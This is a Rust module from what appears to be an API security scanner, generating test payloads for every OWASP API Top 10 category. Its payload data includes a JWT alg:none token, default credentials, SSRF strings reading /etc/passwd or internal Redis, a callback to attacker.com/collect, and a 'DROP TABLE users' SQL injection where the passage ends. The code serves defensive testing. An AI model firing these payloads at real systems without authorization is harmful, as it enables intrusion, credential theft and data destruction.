//! OWASP API Security Top 10 Payload Generators
//!
//! This module provides payload generators for each OWASP API category,
//! creating targeted attack patterns for security testing.

use super::categories::OwaspCategory;
use super::config::OwaspApiConfig;
use serde::{Deserialize, Serialize};

/// A payload for OWASP API security testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OwaspPayload {
    /// The OWASP category this payload tests
    pub category: OwaspCategory,
    /// Description of what this payload tests
    pub description: String,
    /// The actual payload value
    pub value: String,
    /// Where to inject the payload
    pub injection_point: InjectionPoint,
    /// Expected behavior if vulnerable
    pub expected_if_vulnerable: ExpectedBehavior,
    /// Additional context or notes
    #[serde(default)]
    pub notes: Option<String>,
}

/// Where to inject the payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InjectionPoint {
    /// In URL path parameters (e.g., /users/{id})
    PathParam,
    /// In URL query parameters (e.g., ?id=123)
    QueryParam,
    /// In request body (JSON field)
    Body,
    /// In HTTP header
    Header,
    /// Remove or omit (e.g., remove auth header)
    Omit,
    /// Modify existing value
    Modify,
}

/// Expected behavior if the target is vulnerable
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExpectedBehavior {
    /// Expect success (2xx) when it should fail
    SuccessWhenShouldFail,
    /// Expect access to other user's data
    UnauthorizedDataAccess,
    /// Expect field to be accepted and persisted
    FieldAccepted,
    /// Expect no rate limiting
    NoRateLimiting,
    /// Expect internal data exposure
    InternalDataExposure,
    /// Expect endpoint to exist (non-404)
    EndpointExists,
    /// Expect missing security headers
    MissingSecurityHeaders,
    /// Expect verbose error information
    VerboseErrors,
    /// Custom expected behavior
    Custom(String),
}

/// Generator for OWASP API security payloads
pub struct OwaspPayloadGenerator {
    config: OwaspApiConfig,
}

impl OwaspPayloadGenerator {
    /// Create a new payload generator with configuration
    pub fn new(config: OwaspApiConfig) -> Self {
        Self { config }
    }

    /// Generate all payloads for enabled categories
    pub fn generate_all(&self) -> Vec<OwaspPayload> {
        let mut payloads = Vec::new();

        for category in self.config.categories_to_test() {
            payloads.extend(self.generate_for_category(category));
        }

        payloads
    }

    /// Generate payloads for a specific category
    pub fn generate_for_category(&self, category: OwaspCategory) -> Vec<OwaspPayload> {
        match category {
            OwaspCategory::Api1Bola => self.generate_bola_payloads(),
            OwaspCategory::Api2BrokenAuth => self.generate_auth_payloads(),
            OwaspCategory::Api3BrokenObjectProperty => self.generate_property_payloads(),
            OwaspCategory::Api4ResourceConsumption => self.generate_resource_payloads(),
            OwaspCategory::Api5BrokenFunctionAuth => self.generate_function_auth_payloads(),
            OwaspCategory::Api6SensitiveFlows => self.generate_flow_payloads(),
            OwaspCategory::Api7Ssrf => self.generate_ssrf_payloads(),
            OwaspCategory::Api8Misconfiguration => self.generate_misconfig_payloads(),
            OwaspCategory::Api9ImproperInventory => self.generate_discovery_payloads(),
            OwaspCategory::Api10UnsafeConsumption => self.generate_unsafe_consumption_payloads(),
        }
    }

    /// API1: Broken Object Level Authorization (BOLA) payloads
    fn generate_bola_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Numeric ID manipulation
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "ID increment by 1".to_string(),
                value: "{{original_id + 1}}".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Replace ID with ID+1 to access other user's resource".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "ID decrement by 1".to_string(),
                value: "{{original_id - 1}}".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Replace ID with ID-1 to access other user's resource".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "First user ID (0)".to_string(),
                value: "0".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Try accessing resource with ID 0".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "First user ID (1)".to_string(),
                value: "1".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Try accessing resource with ID 1 (often admin)".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "Negative ID".to_string(),
                value: "-1".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Try accessing resource with negative ID".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "Large ID".to_string(),
                value: "999999999".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: None,
            },
            // UUID manipulation
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "Null UUID".to_string(),
                value: "00000000-0000-0000-0000-000000000000".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Try null UUID which may match admin or default resource".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "All-ones UUID".to_string(),
                value: "ffffffff-ffff-ffff-ffff-ffffffffffff".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: None,
            },
            // Query parameter ID manipulation
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "User ID in query parameter".to_string(),
                value: "user_id=1".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: Some("Override user context via query parameter".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api1Bola,
                description: "Account ID in query parameter".to_string(),
                value: "account_id=1".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::UnauthorizedDataAccess,
                notes: None,
            },
        ]
    }

    /// API2: Broken Authentication payloads
    fn generate_auth_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Missing authentication
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "No Authorization header".to_string(),
                value: "".to_string(),
                injection_point: InjectionPoint::Omit,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Remove Authorization header entirely".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Empty Bearer token".to_string(),
                value: "Bearer ".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Send Bearer prefix with no token".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Invalid token (garbage)".to_string(),
                value: "Bearer invalidtoken123".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: None,
            },
            // JWT manipulation
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "JWT alg:none attack".to_string(),
                value: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("JWT with algorithm set to 'none'".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "JWT with admin claim".to_string(),
                value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.stub".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("JWT with role:admin claim (unsigned)".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Expired JWT".to_string(),
                value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxMDAwMDAwMDAwfQ.stub".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("JWT with expired timestamp".to_string()),
            },
            // Basic auth attacks
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Basic auth with admin:admin".to_string(),
                value: "Basic YWRtaW46YWRtaW4=".to_string(), // admin:admin
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Common default credentials".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Basic auth with admin:password".to_string(),
                value: "Basic YWRtaW46cGFzc3dvcmQ=".to_string(), // admin:password
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: None,
            },
            // API key attacks
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Empty API key".to_string(),
                value: "".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("X-API-Key header with empty value".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api2BrokenAuth,
                description: "Test API key".to_string(),
                value: "test".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Common test/development API key".to_string()),
            },
        ]
    }

    /// API3: Broken Object Property Level Authorization (Mass Assignment)
    fn generate_property_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Role/privilege escalation
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Add admin role".to_string(),
                value: r#"{"role": "admin"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: Some("Mass assignment of admin role".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set is_admin flag".to_string(),
                value: r#"{"is_admin": true}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set isAdmin flag".to_string(),
                value: r#"{"isAdmin": true}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set permissions array".to_string(),
                value: r#"{"permissions": ["admin", "write", "delete"]}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            // Verification bypass
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set verified flag".to_string(),
                value: r#"{"verified": true}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set email_verified flag".to_string(),
                value: r#"{"email_verified": true}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            // Financial manipulation
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Modify balance".to_string(),
                value: r#"{"balance": 999999}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: Some("Mass assignment of account balance".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Modify credits".to_string(),
                value: r#"{"credits": 999999}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set price to zero".to_string(),
                value: r#"{"price": 0}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            // Password/credential modification
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set password directly".to_string(),
                value: r#"{"password": "newpassword123"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: Some("Direct password field assignment".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Set password_hash".to_string(),
                value: r#"{"password_hash": "$2a$10$attackerhash"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: None,
            },
            // Internal fields
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Modify user_id".to_string(),
                value: r#"{"user_id": 1}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: Some("Reassign resource to different user".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api3BrokenObjectProperty,
                description: "Modify created_at".to_string(),
                value: r#"{"created_at": "2020-01-01T00:00:00Z"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::FieldAccepted,
                notes: Some("Modify internal timestamp".to_string()),
            },
        ]
    }

    /// API4: Unrestricted Resource Consumption payloads
    fn generate_resource_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Pagination abuse
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Excessive page limit".to_string(),
                value: "limit=100000".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("Request excessive records per page".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Alternative limit parameter".to_string(),
                value: "per_page=100000".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Page size abuse".to_string(),
                value: "page_size=100000".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Size parameter".to_string(),
                value: "size=100000".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: None,
            },
            // Negative pagination
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Negative limit".to_string(),
                value: "limit=-1".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("Negative limit may return all records".to_string()),
            },
            // Deeply nested JSON
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Deeply nested JSON".to_string(),
                value: Self::generate_deep_json(100),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("100 levels of nesting".to_string()),
            },
            // Long string
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Very long string value".to_string(),
                value: format!(r#"{{"data": "{}"}}"#, "A".repeat(100_000)),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("100KB string value".to_string()),
            },
            // Array with many elements
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Large array".to_string(),
                value: format!(
                    r#"{{"items": [{}]}}"#,
                    (0..10000).map(|i| i.to_string()).collect::<Vec<_>>().join(",")
                ),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("Array with 10000 elements".to_string()),
            },
            // Query expansion
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Wildcard expansion".to_string(),
                value: "expand=*".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("Expand all nested resources".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api4ResourceConsumption,
                description: "Include all relations".to_string(),
                value: "include=*".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: None,
            },
        ]
    }

    /// API5: Broken Function Level Authorization payloads
    fn generate_function_auth_payloads(&self) -> Vec<OwaspPayload> {
        let mut payloads = Vec::new();

        // Add payloads for admin paths
        for path in self.config.all_admin_paths() {
            payloads.push(OwaspPayload {
                category: OwaspCategory::Api5BrokenFunctionAuth,
                description: format!("Access admin path: {}", path),
                value: path.to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Attempt to access privileged endpoint with regular auth".to_string()),
            });
        }

        // Method manipulation
        payloads.extend(vec![
            OwaspPayload {
                category: OwaspCategory::Api5BrokenFunctionAuth,
                description: "DELETE on read-only resource".to_string(),
                value: "DELETE".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Try DELETE method on supposedly read-only resource".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api5BrokenFunctionAuth,
                description: "PUT on read-only resource".to_string(),
                value: "PUT".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api5BrokenFunctionAuth,
                description: "PATCH on read-only resource".to_string(),
                value: "PATCH".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: None,
            },
        ]);

        payloads
    }

    /// API6: Unrestricted Access to Sensitive Business Flows
    fn generate_flow_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Rapid request patterns (tested at runtime)
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Repeated operation (rate test)".to_string(),
                value: "{{repeat:10}}".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::NoRateLimiting,
                notes: Some("Execute same operation 10 times rapidly".to_string()),
            },
            // Token reuse
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Reuse one-time token".to_string(),
                value: "{{reuse_token}}".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Attempt to reuse a token that should be single-use".to_string()),
            },
            // Step skipping
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Skip validation step".to_string(),
                value: "{{skip_step:validation}}".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::SuccessWhenShouldFail,
                notes: Some("Skip intermediate validation step in multi-step flow".to_string()),
            },
            // Negative quantities
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Negative quantity".to_string(),
                value: r#"{"quantity": -1}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom(
                    "Negative quantity accepted".to_string(),
                ),
                notes: Some("Submit negative quantity in purchase/transfer".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Zero price".to_string(),
                value: r#"{"price": 0}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Zero price accepted".to_string()),
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api6SensitiveFlows,
                description: "Negative amount".to_string(),
                value: r#"{"amount": -100}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom(
                    "Negative amount accepted".to_string(),
                ),
                notes: Some("Submit negative amount in transfer/payment".to_string()),
            },
        ]
    }

    /// API7: Server Side Request Forgery (SSRF) payloads
    fn generate_ssrf_payloads(&self) -> Vec<OwaspPayload> {
        let mut payloads = Vec::new();

        // Internal URLs from config
        for url in &self.config.ssrf_config.internal_urls {
            payloads.push(OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: format!("Internal URL: {}", url),
                value: url.clone(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("SSRF to internal service".to_string()),
            });
        }

        // Cloud metadata URLs
        for url in &self.config.ssrf_config.metadata_urls {
            payloads.push(OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: format!("Cloud metadata: {}", url),
                value: url.clone(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("SSRF to cloud metadata endpoint".to_string()),
            });
        }

        // Additional SSRF bypass techniques
        payloads.extend(vec![
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "Decimal IP for localhost".to_string(),
                value: "http://2130706433/".to_string(), // 127.0.0.1 as decimal
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("127.0.0.1 encoded as decimal integer".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "IPv6 localhost".to_string(),
                value: "http://[0:0:0:0:0:0:0:1]/".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "Localhost subdomain bypass".to_string(),
                value: "http://localhost.attacker.com/".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("DNS rebinding via attacker-controlled subdomain".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "URL with @ bypass".to_string(),
                value: "http://attacker.com@127.0.0.1/".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("URL parser confusion with @ sign".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "File protocol".to_string(),
                value: "file:///etc/passwd".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("File protocol SSRF".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api7Ssrf,
                description: "Gopher protocol".to_string(),
                value: "gopher://127.0.0.1:6379/_INFO".to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("Gopher protocol to internal Redis".to_string()),
            },
        ]);

        payloads
    }

    /// API8: Security Misconfiguration payloads
    fn generate_misconfig_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Security header checks (handled differently - these are response checks)
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Check X-Content-Type-Options header".to_string(),
                value: "X-Content-Type-Options".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::MissingSecurityHeaders,
                notes: Some("Response should include X-Content-Type-Options: nosniff".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Check X-Frame-Options header".to_string(),
                value: "X-Frame-Options".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::MissingSecurityHeaders,
                notes: Some(
                    "Response should include X-Frame-Options: DENY or SAMEORIGIN".to_string(),
                ),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Check Strict-Transport-Security header".to_string(),
                value: "Strict-Transport-Security".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::MissingSecurityHeaders,
                notes: Some("HTTPS endpoints should have HSTS header".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Check Content-Security-Policy header".to_string(),
                value: "Content-Security-Policy".to_string(),
                injection_point: InjectionPoint::Modify,
                expected_if_vulnerable: ExpectedBehavior::MissingSecurityHeaders,
                notes: None,
            },
            // CORS checks
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "CORS wildcard check".to_string(),
                value: "Origin: https://evil.com".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::Custom(
                    "ACAO: * or reflecting arbitrary origin".to_string(),
                ),
                notes: Some(
                    "Check if Access-Control-Allow-Origin allows arbitrary origins".to_string(),
                ),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "CORS null origin".to_string(),
                value: "Origin: null".to_string(),
                injection_point: InjectionPoint::Header,
                expected_if_vulnerable: ExpectedBehavior::Custom("ACAO: null".to_string()),
                notes: Some("Check if null origin is reflected".to_string()),
            },
            // Error handling
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Trigger verbose error".to_string(),
                value: r#"{"invalid": "{{INVALID_JSON"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::VerboseErrors,
                notes: Some("Send malformed JSON to trigger error response".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "SQL syntax error trigger".to_string(),
                value: "'".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::VerboseErrors,
                notes: Some("Check if SQL errors are exposed".to_string()),
            },
            // Debug endpoints
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Debug mode check".to_string(),
                value: "debug=true".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::Custom("Debug info exposed".to_string()),
                notes: Some("Check if debug parameter enables additional output".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api8Misconfiguration,
                description: "Trace mode check".to_string(),
                value: "trace=1".to_string(),
                injection_point: InjectionPoint::QueryParam,
                expected_if_vulnerable: ExpectedBehavior::Custom("Trace info exposed".to_string()),
                notes: None,
            },
        ]
    }

    /// API9: Improper Inventory Management payloads
    fn generate_discovery_payloads(&self) -> Vec<OwaspPayload> {
        let mut payloads = Vec::new();

        // API version discovery
        for version in &self.config.discovery_config.api_versions {
            payloads.push(OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: format!("Discover API version: {}", version),
                value: format!("/{}/", version),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: Some("Check for undocumented API version".to_string()),
            });
        }

        // Common discovery paths
        for path in &self.config.discovery_config.discovery_paths {
            payloads.push(OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: format!("Discover endpoint: {}", path),
                value: path.clone(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: Some("Check for undocumented endpoint".to_string()),
            });
        }

        // Legacy/deprecated paths
        payloads.extend(vec![
            OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: "Old API prefix".to_string(),
                value: "/old/".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: "Legacy API prefix".to_string(),
                value: "/legacy/".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: "Beta API prefix".to_string(),
                value: "/beta/".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api9ImproperInventory,
                description: "Staging API prefix".to_string(),
                value: "/staging/".to_string(),
                injection_point: InjectionPoint::PathParam,
                expected_if_vulnerable: ExpectedBehavior::EndpointExists,
                notes: None,
            },
        ]);

        payloads
    }

    /// API10: Unsafe Consumption of APIs payloads
    fn generate_unsafe_consumption_payloads(&self) -> Vec<OwaspPayload> {
        vec![
            // Callback/webhook injection
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "Webhook URL injection (internal)".to_string(),
                value: r#"{"webhook_url": "http://127.0.0.1:8080/internal"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: Some("Inject internal URL as webhook destination".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "Callback URL injection".to_string(),
                value: r#"{"callback_url": "http://attacker.com/collect"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Callback made to attacker".to_string()),
                notes: None,
            },
            // Data passed to third-party - injection payloads
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "SQL injection in third-party field".to_string(),
                value: r#"{"external_id": "'; DROP TABLE users;--"}"#.to_string(),
